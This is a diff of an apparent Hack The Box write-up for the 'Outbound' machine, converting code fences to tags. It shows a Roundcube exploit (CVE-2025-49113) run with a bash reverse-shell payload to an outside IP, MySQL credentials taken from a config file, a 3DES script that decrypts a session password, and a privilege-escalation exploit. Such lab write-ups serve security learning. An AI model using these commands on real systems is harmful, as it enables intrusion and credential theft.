@@ -22,11 +22,9 @@ Hello! Today I want to talk about a machine called **Outbound**. In my opinion, 
 
 I started with an Nmap scan:
 
-```
-
+<code>
 nmap -sV 10.10.11.77
-
-```
+</code>
 
 Only two ports were open:
 
@@ -49,15 +47,15 @@ According to the information on the [Hack The Box machine page](https://app.hack
 
 I used the public exploit for CVE-2025-49113:
 
-```bash
+<code>
 wget https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/refs/heads/main/CVE-2025-49113.php
-```
+</code>
 
 Then ran:
 
-```bash
-php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'sh -i >& /dev/tcp/10.10.14.87/2311 0>&1'"
-```
+<code>
+php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'sh -i &gt;&amp; /dev/tcp/10.10.14.87/2311 0&gt;&amp;1'"
+</code>
 
 > ✅ This gave me a shell as the `www` user!
 
@@ -67,36 +65,36 @@ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'sh 
 
 Inside the web directory, I found the Roundcube configuration file:
 
-```bash
+<code>
 cat /var/www/html/roundcube/config/config.inc.php
-```
+</code>
 
 It contained MySQL credentials:
 
-```
+<code>
 Username: roundcube  
 Password: RCDBPass2025
-```
+</code>
 
 I logged into the database:
 
-```bash
+<code>
 mysql -u roundcube -pRCDBPass2025 -h localhost roundcube
-```
+</code>
 
 Then ran:
 
-```sql
-USE roundcube;
+<code>
+USE roundcube;  
 SELECT * FROM session;
-```
+</code>
 
 This revealed base64-encoded serialized session data. After decoding it, I found:
 
-```
-username|s:5:"jacob";
+<code>
+username|s:5:"jacob";  
 password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
-```
+</code>
 
 ---
 
@@ -104,34 +102,34 @@ password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
 
 To decrypt the password, I used the following Python script:
 
-```python
-from Crypto.Cipher import DES3
+<code>
+from Crypto.Cipher import DES3  
 from base64 import b64decode
 
-def decrypt_password(encrypted_password, key="rcmail-!24ByteDESkey*Str"):
-    try:
-        des_key = key.encode('utf-8')
-        data = b64decode(encrypted_password)
-        iv = data[:8]
+def decrypt_password(encrypted_password, key="rcmail-!24ByteDESkey*Str"):  
+    try:  
+        des_key = key.encode('utf-8')  
+        data = b64decode(encrypted_password)  
+        iv = data[:8]  
         ciphertext = data[8:]
-        
-        cipher = DES3.new(des_key, DES3.MODE_CBC, iv=iv)
-        decrypted = cipher.decrypt(ciphertext)
-        
-        return decrypted.rstrip(b"\0").decode('utf-8', errors='ignore')
-        
-    except Exception as e:
+
+        cipher = DES3.new(des_key, DES3.MODE_CBC, iv=iv)  
+        decrypted = cipher.decrypt(ciphertext)  
+
+        return decrypted.rstrip(b"\0").decode('utf-8', errors='ignore')  
+
+    except Exception as e:  
         return f"Error: {str(e)}"
 
-encrypted = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
+encrypted = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"  
 print(f"Decrypted password: {decrypt_password(encrypted)}")
-```
+</code>
 
 **Output:**
 
-```
+<code>
 Decrypted password: ********
-```
+</code>
 
 Now, I could log in via SSH using Jacob’s credentials.
 
@@ -141,9 +139,9 @@ Now, I could log in via SSH using Jacob’s credentials.
 
 Once inside, I ran:
 
-```bash
+<code>
 sudo -l
-```
+</code>
 
 I had permission to run a binary called `below`. After some quick research, I found a [privilege escalation exploit](https://github.com/rvizx/CVE-2025-27591) for it.
 
@@ -151,6 +149,5 @@ Running the exploit script gave me **root access**.
 
 ---
 
-Thanks for reading! 😄
+Thanks for reading! 😄  
 Happy hacking!
-
